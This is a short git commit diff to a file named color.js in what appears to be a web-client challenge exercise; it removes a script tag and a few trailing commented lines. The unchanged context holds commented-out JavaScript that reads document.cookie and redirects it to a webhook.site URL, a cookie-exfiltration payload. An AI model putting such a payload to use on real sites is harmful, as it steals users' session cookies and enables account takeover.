65972462a5a5303490fb8d877671224a75102352
NicolasGERVAIS1 <43536214+NicolasGERVAIS1@users.noreply.github.com>
2025-07-31 17:06:25 +0200

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,4 +1,4 @@
-<script> 
+
   //var cookie = document.cookie;
   //alert(cookie);
   //document.location="https://webhook.site/ed28b5cc-045f-4048-b049-2880871dbaad?c="+document.cookie;
@@ -30,6 +30,3 @@ window.onload = () =>  {
 //    }
 //  }
 //};
-
-//xhr.send();
-</script>
